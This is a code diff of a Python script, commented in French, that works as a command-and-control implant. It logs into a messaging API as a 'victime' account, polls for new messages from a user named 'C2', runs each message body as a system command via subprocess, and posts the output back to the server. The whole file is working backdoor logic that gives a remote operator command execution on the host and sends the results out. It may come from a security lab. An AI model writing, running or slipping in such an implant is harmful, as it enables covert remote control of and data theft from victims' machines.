@@ -1,5 +1,5 @@
 import requests
-from datetime import datetime
+import time
 import subprocess
 
 USER = "victime_2"
@@ -9,42 +9,46 @@ PORT = 6000  # le backend Flask écoute ici
 
 find = False
 
+# Auth
 response = requests.post(
     f"http://{IP}:{PORT}/api/auth/login",
     json={"username": USER, "password": PASSWORD},
 )
 response.raise_for_status()
-
 token = response.json()["token"]
+headers = {"Authorization": f"Bearer {token}"}
 
-'definir un premier last en 2000'
+# définir un premier last (placeholder)
 last = {'body': 'vide', 'createdAt': '2000-01-22T17:15:13.611397', 'id': 0, 'username': 'C2'}
+
+# --- baseline : on récupère l'id max actuel de C2 avant d'attendre une nouvelle commande ---
+resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
+resp.raise_for_status()
+messages = resp.json()
+base_id = max((m["id"] for m in messages if m["username"] == "C2"), default=0)
+print(f"[baseline] dernier id connu de C2 = {base_id}")
+
+# boucle jusqu'à trouver un message de C2 avec id > base_id
 while not find:
-
-    response = requests.get(
-        f"http://{IP}:{PORT}/api/messages",
-        headers={"Authorization": f"Bearer {token}"},
-    )
-
-    for message in response.json():
+    resp = requests.get(f"http://{IP}:{PORT}/api/messages", headers=headers)
+    resp.raise_for_status()
+    for message in resp.json():
         body = message["body"]
-        date = message["createdAt"]
         username = message["username"]
-        id = message["id"]
+        mid = message["id"]
 
+        # si message venant de C2 et id strictement supérieur à la baseline
+        if username == "C2" and mid > base_id:
+            last = message.copy()
+            print("coucou — nouveau message trouvé :", last)
+            find = True
+            break
 
-        print(message)
-        if username == "C2":
-            if datetime.fromisoformat(date) > datetime.fromisoformat(last['createdAt']):
-                last = message.copy()
-                print("coucou")
+    if not find:
+        print("fin (rien de nouveau), attente 2s...")
+        time.sleep(2)
 
-    print("fin")
-    print(last)
-
-    find = True
-
-
+# Exécution de la commande récupérée
 try:
     result = subprocess.run(
         last['body'],                      # la commande
@@ -54,16 +58,17 @@ try:
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,  # fusionne stderr -> stdout
     )
-except:
-    result = ""
+    retour = result.stdout
+except Exception as e:
+    retour = f"[ERREUR EXEC] {e}"
 
-retour = result.stdout
+print("Sortie de la commande:\n", retour)
 
-print(retour)
-
+# Envoi du résultat au serveur
 response = requests.post(
     f"http://{IP}:{PORT}/api/messages",
-    headers={"Authorization": f"Bearer {token}"},
+    headers=headers,
     json={"body": retour},
 )
 response.raise_for_status()
+print("Résultat envoyé.")
